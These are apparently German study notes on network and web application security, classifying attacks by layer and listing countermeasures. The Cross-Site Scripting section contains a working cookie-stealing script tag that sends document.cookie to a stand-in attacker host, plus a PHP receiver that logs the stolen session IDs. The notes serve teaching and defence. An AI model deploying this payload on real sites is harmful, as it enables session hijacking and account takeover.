---
erstellt am: 2026-05-28T08:53:00
tags:
  - Informatik
  - IT-Sicherheit
Deckblatt: "[[Deckblatt_Netzwerksicherheit.jpeg]]"
---

# Klassifikation von Verwundbarkeiten und Angriffen
- **header-basiert** -> Veränderung des Protokoll-Headers (oder Footers) entgegen der jeweiligen Spezifikation.
	- Manipulation der Header-Felder, z.B. alle Bits auf "0"
- **protokollbasiert** -> Verstoß gegen die prozessuralen Aspekte / Ablauf eines Protokolls.
	- Eine Verwundbarkeit in einem Protokoll wird ausgenutzt
	- Z.B. TCP Handshake Ablauf wird nicht korrekt ausgeführt.
- **authentifizierungsbasiert** -> alle Aspekte in Verbindung der Kompromittierung des Schutzziels Authentizität.
	-  z.B. Eingriffe / Manipulation einer Authentifizierung
- **verkehrsdatenbasiert** -> Fokus liegt auf dem Netzwerkverkehr.
	- alle Verkehrsdaten sind relevant, z.B. sniffing (Mitlesen mittels Wireshark)

Jede dieser Verwundbarkeiten kann auf jeder Schicht des [[OSI und TCP-IP Referenzmodell|Schichtenmodells]] auftreten. 
Zusätzlich lässt sich der Benutzer auch noch als Layer 8 im [[OSI und TCP-IP Referenzmodell#^42221f|OSI-Referenzmodell]] bezeichnen, welcher mit [[Social Engineering|Social Engineering]] auch angreifbar ist.
Jede Schicht erhält Daten von der unmittelbar darunter liegenden Schicht (-> Eingabe), verarbeitet diese und erzeugt eine Ausgabe für die unmittelbar darüber liegende Schicht - das gleiche gilt auch für die umgekehrte Richtung im Schichtenmodell.
-> Schicht als Algorithmus

Bei der Eingabe unterscheiden wir:
- Steuerungsinformationen (Header + Trailer)
- Nutzdaten (engl. payload)
Letztere werden nicht von der Schicht analysiert und einfach an die nächste Schicht übergeben.
-> Der Angreifer kann Daten grundsätzlich in jede Schicht einspeisen, indem er den jeweiligen Payload oder ggf. den Header anpasst. 

# Netzzugangsschicht
Hauptaufgabe der Netzzugangsschicht ist:
- die Übertragung von Bits in Signale (Bits in (W)LAN Funksignale übersetzen)
- Sicherung gegen Übertragungsfehler 

## Kabel-gebundene Netze
Siehe [[Netzwerkprotokolle#Ethernet]]

## Drahtlose Netze
Siehe [[Netzwerkprotokolle#WiFi]]
- **headerbasiert** -> wenige Möglichkeiten für Angreifer -> Angriffe zielen in der Regel darauf ab, dass das Angriffsziel keine Rahmen mehr erhält
- **protokollbasiert** -> komplexer als Ethernet, daher grundsätzlich größere Angriffsfläche, aber Realisierung hauptsächlich in Hardware -> Angriffe meist komplex
- **authentizitätsbasiert** -> entweder .... oder ....
	- Angreifer versucht auf Konfiguration von Router / AP zuzugreifen
	- [[#Hardware Address Spoofing]]
	- [[#Rogue Wireless Access Point]]
	- [[#Fake Wireless Access Point]]
	- Pre-Shared-Keys -> Wenn alle Benutzer / Geräte das selbe Passwort für den Netzwerkzugriff benutzen, ist das keine gute Authentifizierung
- **verkehrsdatenbasiert**
	- [[#Mitlesen des Netzwerkverkehrs (Sniffing)|Sniffing]] offener WLANs (z.B. WiFiOnICE, Telekom, ....)
	- WEP-Verschlüsselung (IEEE 802.II 6)

## Gängige Angriffsmethoden
### Hardware Address Spoofing
- Fälschen von [[MAC-Adressen]], z.B. im [[Netzwerkprotokolle#Ethernet|Ethernet-Protokoll]]
- "Stehlen" der Rahmen, die für ein anderes Gerät bestimmt sind
- Umgehen einfacher Zugriffsbeschränkungen
	- z.B. MAC-Filterung -> MAC-Adressfilterung ist jedoch veraltet und unpraktisch
- fällt unter authentifizierungsbasiert, weil als jemand anderes ausgeben.

### Mitlesen des Netzwerkverkehrs (Sniffing)
- mitlesbarer Traffic abhängig von Position im Netzwerk
- ggf. zusätzlicher Aufwand notwendig, um alle Rahmen lesen zu können (Switch)
- besonders problematisch in offenen drahtlosen Netzen

### Physische Angriffe
- Angriffe gegen Verkabelung oder Netzwerkkomponenten
- Zerstörung, Manipulation, Sabotage

### Mac-Flooding
- Angriff gegen einen Switch
- Es werden so viele Mac-Adressen auf dem Switch registriert, bis der Mac-Adressen-Speicher des Switches voll ist.
- Gegenmaßnahme des Switches:
	- LRU: Least-Recently-Used -> Es wird immer die älteste Mac-Adresse überschrieben
	- Fail-Open-Modus: -> Der Switch geht über zu einer Funktionsweise wie ein Hub.
		- Eine Angriffsmöglichkeit zum [[#Mitlesen des Netzwerkverkehrs (Sniffing)]] da dann alle Pakete an alle geschickt werden.

### Rogue Wireless Access Point
- Der Angreifer bringt einen AP an einem Switch im Netzwerk des Ziels an
- Durch [[#Mac-Flooding]] kann der Switch dazu gebracht werden (wie ein Hub) alle Daten, die den Switch erreichen, an alle verbundene Geräte weiter zu leiten. (Fail-Open-Modus)
- Der Angreifer kann somit die Daten mitlesen

### Fake Wireless Access Point
- Der Angreifer baut einen AP auf, welcher einem bekannten Netzwerk exakt ähnelt.
	- D.h. es wird sich zum Beispiel als der AP des Angriffsziels ausgegeben
- Geräte die das Netzwerk finden, verbinden sich ggf. automatisch mit dem AP des Angreifers
- Der Angreifer hat somit volle Kontrolle über das Netz mit dem das Gerät des Angriffsziels verbunden ist. 

## Gängige Gegenmaßnahmen
- Verwendung von VLANs
- Zugriffsbeschränkung auf das Netzwerk (Network Access Control)
- WLANs:
	- bei offenen Netzen -> VPNs benutzen
	- nur Verwendung von sicheren Standards (~~WEP~~, ~~WPA~~, WPA2, WPA3)
	- korrekte Konfiguration sicherstellen

# Internetschicht
Siehe [[Netzwerkprotokolle#IPv4|IPv4]] und [[Netzwerkprotokolle#IPv6|IPv6]]
- **header-basiert** -> unterteilt nach
	- Zielrechner-spezifische Headerfelder -> Headerfelder, die während der Übertragung unverändert bleiben
		- Ping of Death -> Durch eine fehlerhafte Implementierung des IPv4-Protokolls in UNIX Systemen konnte man durch einen auf bestimmte Weise präparierten Ping den Rechner zum Absturz bringen -> Aber ist gefixt.
		- Source-IP = Dest.-IP oder Source-IP = Broadcast -> Absturz
	- Transit-spezifische Headerfelder -> Headerfelder, die für den Transit wichtig sind
		- Angriffe führen in der Regel dazu, dass das Paket nicht mehr beim Ziel ankommt / verworfen wird.
- **protokollbasiert**
	- Bei Parallelbetrieb von IPv4 und IPv6 entstehen zusätzliche Sicherheitsrisiken:
		- IPv6-Verbindungen werden nicht ausreichend überwacht -> Sicherheitsmaßnahmen die Standard bei IPv4 sind, werden nicht mehr genutzt, weil sie anders / neu für IPv6 konfiguriert werden müssten, bzw. anders implementiert werden müssten.
		- Konfiguration von Firewalls
		- Tunnelmechanismen (IPv6 -> in IPv4-Paketen)
	- ICMP: 
		- traceroute -> Missbrauch des ICMP und ttl um die Netzwerkkonfiguration Schrittweise zu durchlaufen und damit den Aufbau des Netzwerks zu ermitteln.
		- ICMP-Fehlerpakete provozieren
	- ARP:
		- ARP Cache Poisining -> Die Broadcast Nachfrage, wer welche IP Adresse hat, wird missbraucht, sodass des Angreifer sich als eine andere IP-Adresse ausgeben kann und somit die Pakete bekommt, die an die Adresse gehen sollten
- **authentizitätsbasiert**
	- IP Spoofing, also fälschen der Quell IP-Adresse
- **verkehrsdatenbasiert**
	- sniffing 
	- IP-Flooding -> Denial of Service

## Gängige Gegenmaßnahmen
- IP-Filterung (Paketfilter-Firewalls auf OSI-Layer 3)
- Router-Konfiguration: z.B. ...
	- Header-Feld "Diensttyp" ignorieren, 
	- ICMP von außen nötig?
- VPN
- IPv4 -> NAT 
- Mit Vorsicht - IPSec - kann aber muss nicht helfen

# Transportschicht
Es gibt auf der Transportschicht nur [[Netzwerkprotokolle#TCP|TCP]] und [[Netzwerkprotokolle#UDP|UDP]]. Bei TCP gibt es einen festen Verbindungsaufbau mit Empfangsbestätigung, bei UDP wird einfach ins Netzwerk gerufen.

## TCP
- **header-basiert** -> besonders kritisch! -> Kontroll-Flags
	- Verwendung einer nicht spezifizierten Flag-Kombination ->Kann zum Abbruch aller TCP-Verbindungen des Zielsystems führen, inzwischen aber meist abgefangen
	- Probing Attacks -> Ziel: Betriebssystem des Zielrechners ermitteln
- **protokollbasiert**
	- [[#TCP-Portscan]] -> Ziel: Welche Ports sind auf dem Zielsystem offen? -> Welche Dienste bietet das Zielsystem an?
		- 80 / 443 -> Webserver
		- 587 & 993 -> Mailserver
- **authentizitätsbasiert**
	- Gibts nicht weil auf der Transportschicht keine Authentifizierung stattfindet
- **verkehrsdatenbasiert**
	- sniffing

## UDP
- **header-basiert**
	- kann nicht viel gemacht werden, weil kaum Headerfelder
- **protokollbasiert**
	- baut keine Verbindung auf, daher gibts auch kaum Protokollregeln die gebrochen werden können 
- **authentizitätsbasiert**
	- Gibt es nicht weil auf der Transportschicht keine Authentifizierung stattfindet
- **verkehrsdatenbasiert**
	- sniffing

## Gängige Angriffsmethoden
### TCP-Portscan
- Ermitteln von offenen Ports des Servers. Z.B. mithilfe von [[nmap]].
- Connect-Scan: vollständiger TCP-Verbindungsaufbau
	- Aber dann ist der Angreifer auch in den logs
- SYN-Scan: Abbruch nach Antwort des Servers

### TCP Denial-of-Service-Angriff
- Überfluten des Servers mit SYN-Nachrichten
- Verbrauchen sämtlicher Ressourcen für TCP-Verbindungen
- keine Verbindung zu Server-Dienst mehr möglich
-> **SYN-Flooding** z.B. mit [[hping3]].
**Gegenmaßnahmen gegen SYN-Flooding:**
-> SYN-Cookies
- Speichern der für den Verbindungsaufbau benötigten Daten in Sequenznummer
	- Also Zeitstempel (0..4), maximale Paketgröße des Clients (5..7), Hashwert generiert aus Zeitstempel IPs und Ports von Client und Server.

# Anwendungsschicht
- **header-basiert**
	- am häufigsten Pufferüberläufe im Header des Anwendungsprotokolls
- **protokollbasiert**
	- Kommt sehr stark auf die Details des jeweiligen Protokolls an
	- Angriffe zielen meistens auf die Kompromittierung von Authentifizierungsmechanismen ab
- **authentizitätsbasiert**
	- häufigste Form von Angriffen
- **verkehrsdatenbasiert**
	- sniffing
	- DDoS

## Wichtigste Gegenmaßnahme
Transport Layer Security (TLS)
- Häufig als SSL bezeichnet, aber das eigentliche SSL Protokoll gibt es seit langem schon nicht mehr.
- Zwischen Transport und Anwendungsschicht wird eine Sicherungsschicht geschoben, Absicherung der Daten auf der Anwendungsschicht durch:
	- Verschlüsselung
	- Schutz der Authentizität
	- Schutz der Integrität

# Gängige Angriffsmethoden

#TODO umsortieren

# Web Application Security
besteht aus:
- Präsentation der Daten im Webbrowser
- Applikationslogik vom Applikationsserver
- Datenbank im Hintergrund als Persistenz-Schicht

Beispiele für Angriffsmöglichkeiten der unterschiedlichen Komponenten:
- Webbrowser -> XSS
- Kommunikationsweg -> sniffing, Adversary in the Middle
- Webserver -> DDos
- Datenbank -> SQL Injection

## Session Hijacking
**Definition:** Der Angriff Session Hijacking zielt darauf ab, dass ein Angreifer eine gültige Benutzersitzung (Session) übernimmt, um sich als dieser User auszugeben.

Session-IDs können zum Beispiel an folgenden Stellen auftauchen:
- Als URL-Parameter:
`https://www.domain.com/index.php?id=4711`
- Im Pfad:
`https://www.domain.com/4711/index.php`
- Als Hidden Field im HTML-Code:
`<input type="hidden" name="PHPSESSID" value="4711">`
- Als Cookie:
```
GET /index.php HTTP/1.1
Host: www.domain.com
Cookie: session=4711
```
- Local Storage bzw. Session Storage

## Cross-Site Scripting
**Definition:** Beim Cross-Site Scripting (abgekürzt: XSS) injiziert ein Angreifer schädlichen JavaScript-Code in eine Webseite, der später im Browser anderer Nutzer ausgeführt wird.

### Beispiel
PHP-Skript auf dem Server:
``` php
<?php
	$cookie=($_GET['cookie']);
	$myFile = "CollectedSessions.txt";
	$fh = fopen($myFile, 'a') or die("can't open file");
	$stringData = $cookie."\n";
	fwrite($fh, $stringData);
	fclose($fh);
?>
```
JavaScript Code Injection:
``` html
<script>
	document.location='https://www.attacker.com/cookie_recv.php?cookie='
	+ document.cookie;
</script>
```

## Session Fixation
**Definition:** Bei einer sog. Session Fixation setzt ein Angreifer die Session-ID eines Opfers im Voraus fest und bringt das Opfer dazu, diese Session zu verwenden.
Der User meldet sich unter dieser Session ID an. Der Angreifer kann jetzt mithilfe der Session sich ebenfalls anmelden.
#TODO Nochmal genauer anschauen

Multi-Faktor-Authentifizierung schützt **nicht** für Session Fixation!

### Gegenmaßnahmen
- begrenzte Zeitliche Gültigkeit für Session IDs
- Zerstören der Session ID beim Abmelden des Users
- Im Login Prozess -> bestehende Session ID zuerst zerstören, dann eine neue erzeugen, um sie dem nun authentifizierten User zuzuweisen. 
- Als Nutzer -> Einen auf Sicherheit optimierten Browser verwenden, Browser verwerfen Session-ID in der URL (z.B. Brave)

## Cross-Site Request Forgery (CSRF)
Ein angemeldeter Nutzer wird dazu gebracht eine Aktion auf dem Server durchzuführen

## SQL Injection

### Gegenmaßnahmen
- Escaping von Benutzereingaben
- Nutzung von prepared statements 
- Whitelisting von erlaubten Benutzereingaben

## Command Injection
Z.B. system() aufrufe in php

## Web Application Firewall
Gegenmaßnahme gegen Typischen Web Application Angriffe

# Absicherung eines Netzwerks

## Firewall
Schutz eines gesicherten Bereichs gegen einen potenziell gefährlich werdenden Bereich.

### Paketfilter
Überwacht Netzwerkpakete anhand von Header-Informationen.
- Quell- und Ziel-IP-Adressen
- Protokoll (TCP/UDP)
- Ports (Quell- Zielport)
- ....

### Application Level Gateway
Scannt auch Inhalte auf Informationen die geschützt werden müssen und das Netzwerk nicht verlassen dürfen.

### Festlegung von Firewall-Regeln
Es sollte immer erstmal alles verboten werden. Nut die Ports, die explizit benötigt werden, werden erlaubt.

### Demilitarisierte Zone (DMZ)
Es wird eine Zwischenzone zwischen internem Netzwerk und dem Internet definiert, welche die von außen erreichbaren Geräte beinhaltet, wie z.B. dem Mailserver. Diese sind nur aufs nötigste begrenzt erreichbar, von außen nur um als Client den Dienst nutzen zu können und von Innen um diesen Dienst nutzen und administrieren zu können.

#TODO DMZ Aufbau nochmal anschauen

## Intrusion Detection System

## Intrusion Prevention System

## SIEM

## SOC 
-> Security Operation Center
Abteilung zur Überwachung und Bekämpfung von IT-Angriffen. (In großen Unternehmen)
